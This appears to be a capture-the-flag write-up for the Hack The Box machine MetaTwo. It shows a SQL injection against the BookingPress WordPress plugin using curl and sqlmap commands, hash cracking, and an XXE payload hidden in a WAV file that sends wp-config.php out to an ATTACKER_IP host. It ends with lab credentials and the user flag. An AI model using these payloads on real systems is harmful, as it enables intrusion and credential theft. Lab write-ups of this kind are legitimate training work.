# MetaTwo

<Image src="/images/writeups/htb/metatwo/banner.png" />

### nmap scan

By scanning with nmap we can find three open ports. In particular, on port 80 there is a website available based on Wordpress at the address `metapress.htb`

<Image src="/images/writeups/htb/metatwo/nmap.png" />

### Analyzing the website

By looking to the source code of the index it is possible to see that the website uses Wordpress.

<Image src="/images/writeups/htb/metatwo/source.png" />

We can also notice that a plugin called bookingpress-appointment-booking is used. with version 1.0.10. It is enough to search on Google for vulnerabilities to find a SQLi.

[https://wordpress.org/plugins/bookingpress-appointment-booking/](https://wordpress.org/plugins/bookingpress-appointment-booking/)

[https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

The SQLi is:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

Enumerate dbs

```bash
sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --dbs
```

Enumerate users

```bash
sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch -D blog -T wp_users --dump
```

Get password of admin and manager users

```bash
sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --sql-query "SELECT user_pass FROM wp_users WHERE ID=1"
```

<Image src="/images/writeups/htb/metatwo/sqlmap.png" />

Final hashes

```
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. admin
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 manager
```

Using hashcat and the rockyou list is possible to find the password for manager: `partylikearockstar`.

<Image src="/images/writeups/htb/metatwo/manager.png" />

Once inside we can try to exploit the permissions of the manager user.
We can use tool like Wappalyzer to find the version of Wordpress used by the website (5.6.2).

There is a vulnerability that exploits the upload of a new media element to the website. The vulnerability is described here:

[https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5)

One file will be used for upload:

```xml title="payload.wav"
RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://ATTACKER_IP:ATTACKER_PORT/xxe.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>
```

Another will be server on the attacker machine:

```xml title="xxe.dtd"
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:ATTACKER_PORT/?%data;'>">
```

Change ATTACKER_IP and ATTACKER_PORT with your values.

Remember to serve the file on your local pc:

```bash
python3 -m http.server PORT
```

In the `wp-config.php` we can find the credentials for the ftp server:

```php title="wp-config.php"
...
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
...
```

<Image src="/images/writeups/htb/metatwo/ftp.png" />

In addition to the blog files, there is also a folder called `mailer` where we can find a file `send_email.php`.
Inside the file we can find the credentials for the mail server:

```php title="send_email.php"
...
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
...
```

We can try to use them for ssh:

In this way we obtain the user flag:

```
4df68ef9947c09d45b2cd642455d4e1a
```
